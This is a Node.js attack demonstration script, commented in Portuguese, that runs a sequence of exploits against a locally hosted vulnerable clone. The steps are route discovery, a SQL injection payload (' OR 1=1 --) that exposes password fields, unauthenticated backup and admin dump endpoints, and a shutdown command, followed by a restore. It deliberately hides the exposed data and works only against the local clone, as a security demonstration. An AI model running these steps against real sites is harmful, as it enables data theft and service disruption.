/*
 * Demonstracao ofensiva APENAS contra o clone local.
 * Nao aceita um alvo externo: o URL e fixo em 127.0.0.1.
 * Nao imprime registos, emails, passwords ou tokens; mostra so contagens e campos.
 * O site e sempre reativado no bloco `finally`.
 */
const BASE = 'http://127.0.0.1:3001';
const results = [];

function record(step, ok, evidence) {
  results.push({ step, ok, evidence });
  console.log(`${ok ? 'OK' : 'FALHOU'} | ${step} | ${JSON.stringify(evidence)}`);
}

async function request(path, options) {
  const response = await fetch(`${BASE}${path}`, options);
  const text = await response.text();
  let body = text;
  try {
    body = JSON.parse(text);
  } catch {
    // Algumas rotas devolvem texto simples.
  }
  return { status: response.status, body };
}

async function main() {
  let suspended = false;
  try {
    const home = await request('/');
    record('Confirmar alvo local', home.status === 200, {
      status: home.status,
    });
    if (home.status !== 200) throw new Error('Site local indisponivel; demonstracao cancelada.');

    const robots = await request('/robots.txt');
    record('Reconhecimento de rotas', robots.status === 200 && robots.body.includes('/admin'), {
      status: robots.status,
      adminRevelado: robots.body.includes('/admin'),
    });

    const users = await request('/api/users');
    const publicFields = Object.keys(users.body.usuarios?.[0] || {});
    record('Listagem publica de utilizadores', users.status === 200 && users.body.total > 0, {
      total: users.body.total,
      campos: publicFields,
    });

    const injection = await request(`/api/users?filter=${encodeURIComponent("' OR 1=1 --")}`);
    const injectedFields = Object.keys(injection.body.usuarios?.[0] || {});
    record('Filtro vulneravel expoe campos sensiveis', injection.status === 200 && injectedFields.includes('senha'), {
      total: injection.body.total,
      camposSensiveisExpostos: injectedFields.includes('senha'),
      dadosOcultados: true,
    });

    const backup = await request('/api/backup');
    record('Backups sem autenticacao', backup.status === 200 && Array.isArray(backup.body.backups_disponiveis), {
      ficheiros: backup.body.backups_disponiveis,
      conteudoOcultado: true,
    });

    const dump = await request('/api/admin', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'dump' }),
    });
    record('Dump administrativo sem autenticacao', dump.status === 200 && dump.body.total > 0, {
      total: dump.body.total,
      contemUtilizadores: Array.isArray(dump.body.usuarios),
      dadosOcultados: true,
    });

    const shutdown = await request('/api/admin', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'desligar' }),
    });
    suspended = shutdown.status === 200 && shutdown.body.ok === true;
    const duringShutdown = await request('/api/users');
    record('Indisponibilidade simulada no clone local', suspended && duringShutdown.status === 503, {
      comandoAceiteSemLogin: suspended,
      statusDuranteSuspensao: duringShutdown.status,
    });
  } finally {
    const revive = await request('/api/reviver', { method: 'POST' });
    const afterRevive = await request('/api/users');
    record('Restauro obrigatorio do clone local', revive.status === 200 && afterRevive.status === 200, {
      restauro: revive.status,
      apiDepoisDoRestauro: afterRevive.status,
    });
    if (revive.status !== 200 || afterRevive.status !== 200) process.exitCode = 1;
  }

  const failed = results.filter((result) => !result.ok);
  console.log(`\nRESULTADO: ${results.length - failed.length}/${results.length} verificacoes concluidas.`);
  if (failed.length > 0) process.exitCode = 1;
}

main().catch((error) => {
  console.error(`ERRO: ${error.message}`);
  process.exitCode = 1;
});
